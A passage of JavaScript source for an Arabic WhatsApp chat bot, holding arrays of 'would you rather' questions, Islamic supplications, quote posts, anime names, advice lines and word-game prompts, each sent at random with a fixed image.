"لو خيروك |  بين أن تكون شخص مشغول دائمًا أو أن تكون شخص يشعر بالملل دائمًا؟ ",
"لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ ",
"لو خيروك |  بين استمرار فصل الشتاء دائمًا أو بقاء فصل الصيف؟ ",
"لو خيروك |  بين العيش في القارة القطبية أو العيش في الصحراء؟ ",
"لو خيروك |  بين أن تكون لديك القدرة على حفظ كل ما تسمع أو تقوله وبين القدرة على حفظ كل ما تراه أمامك؟ ",
"لو خيروك |  بين أن يكون طولك 150 سنتي متر أو أن يكون 190 سنتي متر؟ ",
"لو خيروك |  بين إلغاء رحلتك تمامًا أو بقائها ولكن فقدان الأمتعة والأشياء الخاص بك خلالها؟ ",
"لو خيروك |  بين أن تكون اللاعب الأفضل في فريق كرة فاشل أو أن تكون لاعب عادي في فريق كرة ناجح؟ ",
"لو خيروك |  بين ارتداء ملابس البيت لمدة أسبوع كامل أو ارتداء البدلة الرسمية لنفس المدة؟ ",
"لو خيروك |  بين امتلاك أفضل وأجمل منزل ولكن في حي سيء أو امتلاك أسوأ منزل ولكن في حي جيد وجميل؟ ",
"لو خيروك |  بين أن تكون غني وتعيش قبل 500 سنة، أو أن تكون فقير وتعيش في عصرنا الحالي؟ ",
"لو خيروك |  بين ارتداء ملابس الغوص ليوم كامل والذهاب إلى العمل أو ارتداء ملابس جدك/جدتك؟ ",
"لو خيروك |  بين قص شعرك بشكل قصير جدًا أو صبغه باللون الوردي؟ ",
"لو خيروك |  بين أن تضع الكثير من الملح على كل الطعام بدون علم أحد، أو أن تقوم بتناول شطيرة معجون أسنان؟ ",
"لو خيروك |  بين قول الحقيقة والصراحة الكاملة مدة 24 ساعة أو الكذب بشكل كامل مدة 3 أيام؟ ",
"لو خيروك |  بين تناول الشوكولا التي تفضلها لكن مع إضافة رشة من الملح والقليل من عصير الليمون إليها أو تناول ليمونة كاملة كبيرة الحجم؟ ",
"لو خيروك |  بين وضع أحمر الشفاه على وجهك ما عدا شفتين أو وضع ماسكارا على شفتين فقط؟ ",
"لو خيروك |  بين الرقص على سطح منزلك أو الغناء على نافذتك؟ ",
"لو خيروك |  بين تلوين شعرك كل خصلة بلون وبين ارتداء ملابس غير متناسقة لمدة أسبوع؟ ",
"لو خيروك |  بين تناول مياه غازية مجمدة وبين تناولها ساخنة؟ ",
"لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام كريم الأساس لغسيل الأطباق؟ ",
"لو خيروك |  بين تزيين طبق السلطة بالبرتقال وبين إضافة البطاطا لطبق الفاكهة؟ ",
"لو خيروك |  بين اللعب مع الأطفال لمدة 7 ساعات أو الجلوس دون فعل أي شيء لمدة 24 ساعة؟ ",
"لو خيروك |  بين شرب كوب من الحليب أو شرب كوب من شراب عرق السوس؟ ",
"لو خيروك |  بين الشخص الذي تحبه وصديق الطفولة؟ ",
"لو خيروك |  بين أمك وأبيك؟ ",
"لو خيروك |  بين أختك وأخيك؟ ",
"لو خيروك |  بين نفسك وأمك؟ ",
"لو خيروك |  بين صديق قام بغدرك وعدوك؟ ",
"لو خيروك |  بين خسارة حبيبك/حبيبتك أو خسارة أخيك/أختك؟ ",
"لو خيروك |  بإنقاذ شخص واحد مع نفسك بين أمك أو ابنك؟ ",
"لو خيروك |  بين ابنك وابنتك؟ ",
"لو خيروك |  بين زوجتك وابنك/ابنتك؟ ",
"لو خيروك |  بين جدك أو جدتك؟ ",
"لو خيروك |  بين زميل ناجح وحده أو زميل يعمل كفريق؟ ",
"لو خيروك |  بين لاعب كرة قدم مشهور أو موسيقي مفضل بالنسبة لك؟ ",
"لو خيروك |  بين مصور فوتوغرافي جيد وبين مصور سيء ولكنه عبقري فوتوشوب؟ ",
"لو خيروك |  بين سائق سيارة يقودها ببطء وبين سائق يقودها بسرعة كبيرة؟ ",
"لو خيروك |  بين أستاذ اللغة العربية أو أستاذ الرياضيات؟ ",
"لو خيروك |  بين أخيك البعيد أو جارك القريب؟ ",
"لو خيروك |  يبن صديقك البعيد وبين زميلك القريب؟ ",
"لو خيروك |  بين رجل أعمال أو أمير؟ ",
"لو خيروك |  بين نجار أو حداد؟ ",
"لو خيروك |  بين طباخ أو خياط؟ ",
"لو خيروك |  بين أن تكون كل ملابس بمقاس واحد كبير الحجم أو أن تكون جميعها باللون الأصفر؟ ",
"لو خيروك |  بين أن تتكلم بالهمس فقط طوال الوقت أو أن تصرخ فقط طوال الوقت؟ ",
"لو خيروك |  بين أن تمتلك زر إيقاف موقت للوقت أو أن تمتلك أزرار للعودة والذهاب عبر الوقت؟ ",
"لو خيروك |  بين أن تعيش بدون موسيقى أبدًا أو أن تعيش بدون تلفاز أبدًا؟ ",
"لو خيروك |  بين أن تعرف متى سوف تموت أو أن تعرف كيف سوف تموت؟ ",
"لو خيروك |  بين العمل الذي تحلم به أو بين إيجاد شريك حياتك وحبك الحقيقي؟ ",
"لو خيروك |  بين معاركة دب أو بين مصارعة تمساح؟ ",
"لو خيروك |  بين إما الحصول على المال أو على المزيد من الوقت؟ ",
"لو خيروك |  بين امتلاك قدرة التحدث بكل لغات العالم أو التحدث إلى الحيوانات؟ ",
"لو خيروك |  بين أن تفوز في اليانصيب وبين أن تعيش مرة ثانية؟ ",
"لو خيروك |  بأن لا يحضر أحد إما لحفل زفافك أو إلى جنازتك؟ ",
"لو خيروك |  بين البقاء بدون هاتف لمدة شهر أو بدون إنترنت لمدة أسبوع؟ ",
"لو خيروك |  بين العمل لأيام أقل في الأسبوع مع زيادة ساعات العمل أو العمل لساعات أقل في اليوم مع أيام أكثر؟ ",
"لو خيروك |  بين مشاهدة الدراما في أيام السبعينيات أو مشاهدة الأعمال الدرامية للوقت الحالي؟ ",
"لو خيروك |  بين التحدث عن كل شيء يدور في عقلك وبين عدم التحدث إطلاقًا؟ ",
"لو خيروك |  بين مشاهدة فيلم بمفردك أو الذهاب إلى مطعم وتناول العشاء بمفردك؟ ",
"لو خيروك |  بين قراءة رواية مميزة فقط أو مشاهدتها بشكل فيلم بدون القدرة على قراءتها؟ ",
"لو خيروك |  بين أن تكون الشخص الأكثر شعبية في العمل أو المدرسة وبين أن تكون الشخص الأكثر ذكاءً؟ ",
"لو خيروك |  بين إجراء المكالمات الهاتفية فقط أو إرسال الرسائل النصية فقط؟ ",
"لو خيروك |  بين إنهاء الحروب في العالم أو إنهاء الجوع في العالم؟ ",
"لو خيروك |  بين تغيير لون عينيك أو لون شعرك؟ ",
"لو خيروك |  بين امتلاك كل عين لون وبين امتلاك نمش على خديك؟ ",
"لو خيروك |  بين الخروج بالمكياج بشكل مستمر وبين الحصول على بشرة صحية ولكن لا يمكن لك تطبيق أي نوع من المكياج؟ ",
"لو خيروك |  بين أن تصبحي عارضة أزياء وبين ميك آب أرتيست؟ ",
"لو خيروك |  بين مشاهدة كرة القدم أو متابعة الأخبار؟ ",
"لو خيروك |  بين موت شخصية بطل الدراما التي تتابعينها أو أن يبقى ولكن يكون العمل الدرامي سيء جدًا؟ ",
"لو خيروك |  بين العيش في دراما قد سبق وشاهدتها ماذا تختارين بين الكوميديا والتاريخي؟ ",
"لو خيروك |  بين امتلاك القدرة على تغيير لون شعرك متى تريدين وبين الحصول على مكياج من قبل خبير تجميل وذلك بشكل يومي؟ ",
"لو خيروك |  بين نشر تفاصيل حياتك المالية وبين نشر تفاصيل حياتك العاطفية؟ ",
"لو خيروك |  بين البكاء والحزن وبين اكتساب الوزن؟ ",
"لو خيروك |  بين تنظيف الأطباق كل يوم وبين تحضير الطعام؟ ",
"لو خيروك |  بين أن تتعطل سيارتك في نصف الطريق أو ألا تتمكنين من ركنها بطريقة صحيحة؟ ",
"لو خيروك |  بين إعادة كل الحقائب التي تملكينها أو إعادة الأحذية الجميلة الخاصة بك؟ ",
"لو خيروك |  بين قتل حشرة أو متابعة فيلم رعب؟ ",
"لو خيروك |  بين امتلاك قطة أو كلب؟ ",
"لو خيروك |  بين الصداقة والحب ",
"لو خيروك |  بين تناول الشوكولا التي تحبين طوال حياتك ولكن لا يمكنك الاستماع إلى الموسيقى وبين الاستماع إلى الموسيقى ولكن لا يمكن لك تناول الشوكولا أبدًا؟ ",
"لو خيروك |  بين مشاركة المنزل مع عائلة من الفئران أو عائلة من الأشخاص المزعجين الفضوليين الذين يتدخلون في كل كبيرة وصغيرة؟ ",
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`)
              ElgazarBot.sendMessage(from, { image: buffertruth, caption: '*♚ مرحبا بك في لعبة لو خيروك*\nꔹ━━━━━ꔹ\n'+ xeontruth }, {quoted:m})
              break  
              
     case 'truth1': case 'اذكار':
              const truth1 =[
    "اللَّهُمَّ أَعِنِّي عَلَى ذِكْرِكَ , وَشُكْرِكَ , وَحُسْنِ عِبَادَتِكَ🎈💞", 
"االلَّهُمَّ أَعِنِّي عَلَى ذِكْرِكَ , وَشُكْرِكَ , وَحُسْنِ عِبَادَتِكَ🎈💞 ",
"اا6-قول : سبحان الله وبحمده سبحان العظيم مئة مرة في اليوم قارئها غفرت له ذنوبه وأن كانت مثل زبد البحر .",
"من الأدعية النبوية المأثورة:اللهمَّ زَيِّنا بزينة الإيمان",
"اااللهم يا من رويت الأرض مطرا أمطر قلوبنا فرحا.🍂",
"اا‏اللَّهُـمَّ لَڪَ الحَمْـدُ مِنْ قَـا؏ِ الفُـؤَادِ إلىٰ ؏َـرشِڪَ المُقـدَّس حَمْـدَاً يُوَافِي نِـ؏ـمَڪ 💙🌸",
"﴿وَاذْكُرِ اسْمَ رَبِّكَ وَتَبَتَّلْ إِلَيْهِ تَبْتِيلًا﴾🌿✨",
"﴿وَمَن يَتَّقِ اللهَ يُكَفِّرْ عَنْهُ سَيِّئَاتِهِ وَيُعْظِمْ لَهُ أَجْرًا﴾«",
"«سُبْحَانَ اللهِ ، وَالحَمْدُ للهِ ، وَلَا إلَهَ إلَّا اللهُ ، وَاللهُ أكْبَرُ ، وَلَا حَوْلَ وَلَا قُوَّةَ إلَّا بِاللهِ»🍃",
"وذُنُوبًا شوَّهتْ طُهْرَ قُلوبِنا؛ اغفِرها يا ربّ واعفُ عنَّا ❤️",
"«اللَّهُمَّ آتِ نُفُوسَنَا تَقْوَاهَا ، وَزَكِّهَا أنْتَ خَيْرُ مَنْ زَكَّاهَا ، أنْتَ وَلِيُّهَا وَمَوْلَاهَا»🌹",
"۝‏﷽إن اللَّه وملائكته يُصلُّون على النبي ياأيُّها الذين آمنوا صلُّوا عليه وسلِّموا تسليما۝",
"فُسِبًحً بًحًمًدٍ ربًکْ وٌکْنِ مًنِ آلَسِآجّدٍيَنِ 🌿✨",
"اأقُمً آلَصّلَآةّ لَدٍلَوٌکْ آلَشُمًسِ إلَيَ غُسِقُ آلَلَيَلَ🥀🌺",
"نِسِتٌغُفُرکْ ربًيَ حًيَتٌ تٌلَهّيَنِآ آلَدٍنِيَآ عٌنِ ذِکْرکْ🥺😢",
"وٌمًنِ أعٌرض عٌنِ ذِکْريَ فُإنِ لَهّ مًعٌيَشُةّ ضنِکْآ 😢",
"وٌقُرأنِ آلَفُجّر إنِ قُرآنِ آلَفُجّر کْآنِ مًشُهّوٌدٍآ🎀🌲",
"اأّذّأّ أّلَدِنِيِّأّ نَِّستّګوِ أّصٌلَګوِ زِّوِروِ أّلَمَقِأّبِر💔",
"حًتٌيَ لَوٌ لَمًتٌتٌقُنِ آلَخِفُظُ فُمًصّآحًبًتٌ لَلَقُرآنِ تٌجّعٌلَکْ مًنِ آهّلَ آلَلَهّ وٌخِآصّتٌهّ❤🌱",
"وٌإذِآ رضيَتٌ وٌصّبًرتٌ فُهّوٌ إرتٌقُآء وٌنِعٌمًةّ✨🌺",
"«ربً آجّعٌلَنِيَ مًقُيَمً آلَصّلَآةّ وٌمًنِ ذِريَتٌيَ ربًنِآ وٌتٌقُبًلَ دٍعٌآء 🤲",
"اآعٌلَمً آنِ رحًلَةّ صّبًرکْ لَهّآ نِهّآيَهّ عٌظُيَمًهّ مًحًمًلَهّ بًجّوٌآئزٍ ربًآنِيَهّ مًدٍهّشُهّ🌚☺️",
"اإيَآکْ وٌدٍعٌوٌةّ آلَمًظُلَوٌمً فُ إنِهّآ تٌصّعٌدٍ آلَيَ آلَلَهّ کْأنِهّآ شُرآرهّ مًنِ نِآر 🔥🥺",
"اآلَلَهّمً آنِقُذِ صّدٍوٌرنِآ مًنِ هّيَمًنِهّ آلَقُلَقُ وٌصّبً عٌلَيَهّآ فُيَضآ مًنِ آلَطِمًأنِيَنِهّ✨🌺",
"يَآبًنِيَ إنِ صّلَآح آلَحًيَآةّ فُ أتٌجّآهّ آلَقُبًلَهّ 🥀🌿",
"«آلَلَهّمً ردٍنِآ إلَيَکْ ردٍآ جّمًيَلَآ💔🥺",
"اللهم طهر قلبي من كل خلق لا يرضيك اللهم يا مقلب القلوب ثبت قلوبنا وقلوب إخواننا على دينك وطاعتك. إلهي عوضني خيرا فيمن فقدت واحفظ ",
"إلهي عوضني خيرا فيمن فقدت واحفظ لي من أحببت اللهم اجعلني أنا وقارئ هذه الرسالة من السبعين ألفا الذين يدخلون الجنة بلا حساب ولا سابق عذاب أمين يا الله حسبي الله لا إله إلا هو عليه توكلت وهو رب العرش العظيم ",
"والْعَصْر إِنَّ الْإِنْسَان لَفِي خُسْر إِلَّا الَّذِينَ آمَنُوا وعَمِلُوا الصَّالِحَات وتَوَاصَوْا بِالْحَقِّ وتَوَاصَوْا بِالصَّبْرِ. ",
"اذكر الله في راحِتك ليذكُرك في حاجْتك ",
"‏اللهمَّ أَخْرِجْنَا من ضيقِ أنفُسِنا إلى سِعةِ رحمتِكَ 💙 ",
"يارب يامنزل الغيث من السماء ابعد البلاء عن بلادنا و بلاد المسلمين اجمعين 💙 ",
"يارب إن ضاقت بي الدنيا من الناس ارحمني برحمتك يا لطيف يا رحيم 💙 ",
"‏اللهمّ الكتف الثابت الذي لا تهون عليه مواجعنا 💙 ",
"‏اللهم صّلِ وسَلّمْ عَلى نَبِيْنَا مُحَمد ﷺ 💙 ",
"‏اللهم أجعل لي نصيب في كل شئ أحببته💙 ",
"اجعلوا للقرآن نصيبًا مِن فجركم 💙 ",
"اللهم اشفي كل عزيز و غالي 💙 ",
"يارب ابعد عنا ضيق الدنيا و متاعبها 💙 ",
"يارب العالمين اغفر لي وارحمن ",
"‏مامن لسان يستغفر إلا فتحت له الدنيا بما فيها أستغفرك ربي وأتوب إليك "
]
              const xeontruth1 = truth1[Math.floor(Math.random() * truth1.length)]
              buffertruth1 = await getBuffer(`https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`)
              ElgazarBot.sendMessage(from, { image: buffertruth1, caption: '*♚ مرحبا بك في قسم الاذكار*\nꔹ━━━━━ꔹ\n'+ xeontruth1 }, {quoted:m})
              break
       
       case 'hfuduf': case 'بوست':
              const hfuduf =[
    " أحياناً.. ويصبح الوهم حقيقه😪.",
" الجمال يلفت الأنظار لكن الطيبه تلفت القلوب🙂 .!",
"لا تحقرون صغيره إن الجبال من الحصي 💖",
"لا تمد عينك في يد غيرك 💕",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ. 🌚.",
"‏ هل كانت كل الطرق تؤدي إليكِ، أم أنني كنتُ أجعلها كذلك. 🤫 .!",
"ويُرهقني أنّي مليء بما لا أستطيع قوله.✨ ",
"‏أَكَان عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ؟. 😁",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء. 😎",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ. 😃",
"لا تظلم حتى لا تتظلم 😊",
"لا حياه للإنسان بلا نبات ☺️",
"لا تقف قصاد الريح ولا تمشي معها.... ❤️",
" لا تملح الا لمن يستحقاها ويحافظ عليها😛",
"لا يدخل الجنه من لايأمن من جازه بوائقه 😿.",
"لا دين لمن لا عهد له 💞 ",
"لا تظلم حتى لا تتظلم 🌚.",
"عامل الناس بأخلاقك ولا بأخلاقهم 💞⛷️",
"لا تقف قصاد الريح ولا تمشي معها.... 💚 ",
"‏ ‏أحببتك وأنا منطفئ، فما بالك وأنا في كامل توهجي ؟ 🙂 .!",
"‏من ترك أمرهُ لله، أعطاه الله فوق ما يتمنَّاه💙 ",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ، انتصار. »💛",
"‏ ‏كل العالم يهون بس الدنيا بينا تصفي 💙 ",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء. 😚 ",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ، انتصار. 💝",
"‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ 🙂 .!",
"‏من علامات جمال المرأة .. بختها المايل ! ❤️",
"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة.💜 ",
"‏ كلما أتبع قلبي يدلني إليك . 😜",
"‏ انك الجميع و كل من احتل قلبي🫀🤍 ",
"‏ بس لما أنا ببقى فايق، ببقى أبكم له ودان.💖 ",
"‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️ ",
"‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ 💕",
" ‏ ‏تبدأ حياتك محاولاً فهم كل شيء، وتنهيها محاولاً النجاة من كل ما فهمت.💖",
"الجمال يلفت الأنظار لكن الطيبه تلفت القلوب 😁",
"كما تدين تدان 😊",
"عامل الناس بأخلاقك ولا بأخلاقهم 🙂",
"يسروا ولا تعسروا... ويشورا ولا تنفروا 💕",
" لا يدخل الجنه من لايأمن من جازه بوائقه💓",
" كل كتير عادي ميهمكش😂❤️",
"لا تملح الا لمن يستحقاها ويحافظ عليها 💞 ",
" الجمال يلفت الأنظار لكن الطيبه تلفت القلوب💞 ",
" خليك طبيعي مش نورم😇❤️ ",
" الدنيا حلوه متزعلش علي ناس ماتستاهلش🌝🏃‍♂️",
" العقل السليم ف البعد عن الحريم😇❤️",
"عيش الحياه يوم واحد 🙂 .! ",
"امشي كتير عشان تخس 🧐 .! ",
" اشرب ميه كتير 😎.",
"كُنْ لحوحاً فِي الدّعاءِ،فقدْ أوشكَ السّهمُ أنْ يُصيبَ. 💗",                    
"‏من ترك أمرهُ لله، أعطاه الله فوق ما يتمنَّاه💙 ", 
"‏من علامات جمال المرأة .. بختها المايل ! ",
"‏ انك الجميع و كل من احتل قلبي🫀🤍",
"‏ ‏ لقد تْعَمقتُ بكَ كَثيراً والمِيمُ لام .♥️",
"‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️",
"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة. ⋆ 💜",
"‏ يجي اي الصاروخ الصيني ده جمب الصاروخ المصري لما بيلبس العبايه السوده.🤩♥️",
"‏ كُنت أرقّ من أن أتحمّل كُل تلك القَسوة من عَينيك .🍍",
"‏أَكَان عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ؟.",
"‏ •كُلما أتبع قلبي يدلني إليك .",
"‏ •أيا ليت من تَهواه العينُ تلقاهُ .",
"‏ ‏: رغبتي في مُعانقتك عميقة جداً .??",
"ويُرهقني أنّي مليء بما لا أستطيع قوله.✨",
"‏ من مراتب التعاسه إطالة الندم ع شيء إنتهى. ⋆ ",
"‏ ‏كل العالم يهون بس الدنيا بينا تصفي 💙",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ.",
"‏ ‏تبدأ حياتك محاولاً فهم كل شيء، وتنهيها محاولاً النجاة من كل ما فهمت.",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء.",
"‏ هل كانت كل الطرق تؤدي إليكِ، أم أنني كنتُ أجعلها كذلك.",
"‏ ‏هَتفضل توآسيهُم وآحد ورآ التآني لكن أنتَ هتتنسي ومحدِش هَيوآسيك.",
"‏ جَبَرَ الله قلوبِكُم ، وقَلبِي .🍫",
"‏ بس لما أنا ببقى فايق، ببقى أبكم له ودان.💖",
"‏ ‏مقدرش عالنسيان ولو طال الزمن 🖤",
"‏ أنا لستُ لأحد ولا احد لي ، أنا إنسان غريب أساعد من يحتاجني واختفي.",
"‏ ‏أحببتك وأنا منطفئ، فما بالك وأنا في كامل توهجي ؟",
"‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ",
"‏ وانتهت صداقة الخمس سنوات بموقف.",
"‏ ‏لا تحب أحداً لِدرجة أن تتقبّل أذاه.",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ، انتصار.",
"‏مش جايز , ده اكيد التأخير وارهاق القلب ده وراه عوضاً عظيماً !💙 ",
" مش جايز , ده اكيد التأخير وارهاق القلب ده وراه عوضاً عظيماً !💙",
"فـ بالله صبر  وبالله يسر وبالله عون وبالله كل شيئ ♥️. ",
"أنا بعتز بنفسي جداً كصاحب وشايف اللي بيخسرني ، بيخسر أنضف وأجدع شخص ممكن يشوفه . ",
"فجأه جاتلى قافله ‏خلتنى مستعد أخسر أي حد من غير ما أندم عليه . ",
"‏اللهُم قوني بك حين يقِل صبري... ",
"‏يارب سهِل لنا كُل حاجة شايلين هَمها 💙‏ ",
"انا محتاج ايام حلوه بقي عشان مش نافع كدا ! ",
"المشكله مش اني باخد قررات غلط المشكله اني بفكر كويس فيها قبل ما اخدها .. ",
"تخيل وانت قاعد مخنوق كدا بتفكر فالمزاكره اللي مزكرتهاش تلاقي قرار الغاء الدراسه .. ",
" مكانوش يستحقوا المعافرة بأمانه.",
"‏جمل فترة في حياتي، كانت مع اكثر الناس الذين أذتني نفسيًا. ",
" ‏إحنا ليه مبنتحبش يعني فينا اي وحش!",
"أيام مُمله ومستقبل مجهول ونومٌ غير منتظموالأيامُ تمرُ ولا شيَ يتغير ", 
"عندما تهب ريح المصلحه سوف ياتي الجميع رتكدون تحت قدمك ❤️. ",
"عادي مهما تعادي اختك قد الدنيا ف عادي ❤. ",
"بقيت لوحدي بمعنا اي انا اصلا من زمان لوحدي.❤️ ",
"- ‏تجري حياتنا بما لاتشتهي أحلامنا ! ",
"تحملين كل هذا الجمال، ‏ألا تتعبين؟",
"البدايات للكل ، والثبات للصادقين ",
"مُؤخرًا اقتنعت بالجملة دي جدا •Private life always wins. ",
" الافراط في التسامح بيخللي الناس تستهين بيك🍍",
"مهما كنت كويس فـَ إنت معرض لـِ الاستبدال.. ",
"فخوره بنفسي جدًا رغم اني معملتش حاجه فـ حياتي تستحق الذكر والله . ",
"‏إسمها ليلة القدر لأنها تُغير الأقدار ,اللهُمَّ غير قدري لحالٍ تُحبه وعوضني خير .. ",
"فى احتمال كبير انها ليلة القدر ادعوا لنفسكم كتير وأدعو ربنا يشفى كل مريض. 💙 ",
"أنِر ظُلمتي، وامحُ خطيئتي، واقبل توبتي وأعتِق رقبتي يا اللّٰه. إنكَ عفوٌّ تُحِبُّ العفوَ؛ فاعفُ عني 💛 ",
]
              const xeonhfuduf = hfuduf[Math.floor(Math.random() * hfuduf.length)]
              bufferhfuduf = await getBuffer(`https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`)
              ElgazarBot.sendMessage(from, { image: bufferhfuduf, caption: '*♚ مرحبا بك في البوستات*\nꔹ━━━━━ꔹ\n'+ xeonhfuduf }, {quoted:m})
              break
       
       case 'gmscat': case 'كت':
              const gmscat =[
    "『فيجيتا』","『غوكو』","『شيسوي』","『ايتاشي』","『ناروتو』","『كيلوا』","『لوفي زورو سانجي』","『زاراكي ايزن توسين』","『ناروتو ساسكي كاكاشي』","『مادارا اوبيتو』","『هاشيراما توبيراما』","『انزاي دازاي』","『هاغومورو』","『سوكونا يوجي』","『كاكاشي هاتاكي』","『فوغاكو اوتشيها』","『ناروتو اوزوماكي』","『غارب لوفي ايس ساب』و","『اكاينو اوكيجي كيزارو』","『غون كيلوا』","『اوميني』","『سيلفا زينو نيترو』","『استا يامي』","『كيسكي يوروتشي ايتشيغو』","『ساروتوبي دانزو』","『فوجيتورا』","『نامي روبين』","『هيماواري هينات』","『ستارك جريمجو نيل』","『الوكا』","『شينو كيبا』","『روك لي مايت غاي』","『ايتاشي ساسكي』","『كونان ناغاتو ياهيكو』","『جيرايا تسونادي』","『ساي اينو』","『شينرا』","『ثوركيل ثورفين ثورز』","『اشيلاد』","『لاو ميهوك زورو』","『تيتش ادوارد』","『ناكا اوتشيها』","『هيروزين ساروتوبي』","『مونكي دي لوفي』","『كارين』","『موريا』","『اشورا هامورا』","『انيوشا كاجومي』","『ديدارا ساسوري』","『روجر رايلي』","『تانجيرو نيزيكو』","『زينيتسو اينوسكي』","『زيك ايرين』","『ميكاسا اني』","『ليفاي اكيرمان』","『ايروين مايكي』","『مايكي دراكن』","『هيسوكا』","『ارمين』","『هاتسوني ميكو』","『كورو』","『اوراهارا كيسكي』","『شينوبو كاناو』","『كيسامي اكاشي』","『كوزان』",
]
              const xeongmscat = gmscat[Math.floor(Math.random() * gmscat.length)]
              buffergmscat = await getBuffer(`https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`)
              ElgazarBot.sendMessage(from, { image: buffergmscat, caption: '*♚ مرحبا بك في كت*\nꔹ━━━━━ꔹ\n'+ xeongmscat }, {quoted:m})
              break
       
       case 'isjshsd': case 'انصح':
              const isjshsd =[
    "عامل الناس بأخلاقك ولا بأخلاقهم", 
"الجمال يلفت الأنظار لكن الطيبه تلفت القلوب ", 
"الاعتذار عن الأخطاء لا يجرح كرامتك بل يجعلك كبير في نظر الناس ",
"لا ترجي السماحه من بخيل.. فما في البار لظمان ماء",
"لا تحقرون صغيره إن الجبال من الحصي",
"لا تستحي من إعطاء فإن الحرمان أقل منه ", 
"لا تظلم حتى لا تتظلم ",
"لا تقف قصاد الريح ولا تمشي معها ",
"لا تكسب موده التحكم الا بالتعقل",
"لا تمد عينك في يد غيرك ",
"لا تملح الا لمن يستحقاها ويحافظ عليها",
"لا حياه للإنسان بلا نبات",
"لا حياه في الرزق.. ولا شفاعه في الموت",
"كما تدين تدان",
"لا دين لمن لا عهد له ",
"لا سلطان على الدوق فيما يحب أو بكره",
"لا مروه لمن لادين له ",
"لا يدخل الجنه من لايأمن من جازه بوائقه",
"يسروا ولا تعسروا... ويشورا ولا تنفروا",
"يدهم الصدر ما يبني العقل الواسع ",
"أثقل ما يوضع في الميزان يوم القيامة حسن الخلق ",
"أجهل الناس من ترك يقين ما عنده لظن ما عند الناس ",
"أحياناً.. ويصبح الوهم حقيقه ",
"مينفعش تعاتب حد مبيعملش حساب لزعلك عشان متزعلش مرتين . ",
"السفر ومشاهده اماكن مختلفه وجديده ",
"عدم تضيع الفرص واسثمارها لحظه مجبئها ",
" اعطاء الاخرين اكثر من ما يتوقعون",
"معامله الناس بلطف ولكن عدم السماح لاحد بستغالال ذالك ",
"تكوين صدقات جديده مع الحفظ بلاصدقاء القودامي ",
"تعلم اصول المهنه بدلا من تضيع الوقت ف تعلم حيل المهنه ",
"مدح ع الاقل ثلاث اشخاص يوميا ",
"النظر ف عيون الشخاص عند مخاطبتهم ",
"التحلي بلسماح مع الاخرين او النفس ",
"الاكثار من قول كلمه شكرا ",
" مصافحه الاخرين بثبات وقوة ",
"الابتعاد عن المناطق السيئه السمعه لتجنب الاحداث السئه ",
" ادخار 10٪ع الاقل من الدخل",
" تجنب المخاوف من خلال التعلم من تجارب مختلفه",
" الحفاظ ع السمعه لانها اغلي ما يملك الانسان",
" تحويل الاعداء الي اصدقاء من خلال القيام بعمل جيد",
"لا تصدق كل ما تسمعع. ولا تنفق كل ما تمتلك . ولا تنم قدر ما ترغب ",
" اعتني بسمعتك جيدا فستثبت للك الايام انها اغلي ما تملك",
"حين تقول والدتك ستندم ع فعل ذالك ستندم عليه غالبا.. ",
" لا تخش العقبات الكبيره فخلفها تقع الفرص العظيمه",
"قد لا يتطلب الامر اكثر من شخص واحد لقلب حياتك رأس ع عقب ",
"اختر رفيقه حياتك بحرص فهو قرار سيشكل 90٪من سعادتك او بؤسك ",
" اقلب اداءك الاصدقاء بفعل شي جميل ومفجائ لهم",
"حين تدق الفرصه ع باباك ادعوها للبيت ",
"تعلم القواعد جيدا ثن اكسر بعدها ",
"احكم ع نجاحك من خلال قدرتك ع العطاء وليس الاخذ ",
" لا تتجاهل الشيطان مهما بدل ثيابه",
"ركز ع جعل الاشياء افضل وليس اكبر او اعظم ",
"كن سعيد  بما تمتلك واعمل لامتلاك ما تريد ",
"اعط الناس اكثر من ما يتوقعون ",
" لا تكن منشغل لدرجه عدم التعرف ع اصدقاء جدد",
"استحمه يوم العيد يمعفن🤓",
"مش تحب اي حد يقرب منك ",
" خليك مع البت راجل خليك تقيل🥥",
" انصح نفسك بنفسك بمت😆",
" كنت نصحت نفسي ياخويا😹",
]
              const xeonisjshsd = isjshsd[Math.floor(Math.random() * isjshsd.length)]
              bufferisjshsd = await getBuffer(`https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg`)
              ElgazarBot.sendMessage(from, { image: bufferisjshsd, caption: '*♚ اتفضل النصيحه اعمل بيها*\nꔹ━━━━━ꔹ\n'+ xeonisjshsd }, {quoted:m})
              break
       
       case 'idhsisgd': case 'حروف':
              const idhsisgd =[
    " جماد بحرف ⤌ ر  ", 
" مدينة بحرف ⤌ ع  ",
" حيوان ونبات بحرف ⤌ خ  ", 
" اسم بحرف ⤌ ح  ", 
" اسم ونبات بحرف ⤌ م  ", 
" دولة عربية بحرف ⤌ ق  ", 
" جماد بحرف ⤌ ي  ", 
" نبات بحرف ⤌ ج  ", 
" اسم بنت بحرف ⤌ ع  ", 
" اسم ولد بحرف ⤌ ع  ", 
" اسم بنت وولد بحرف ⤌ ث  ", 
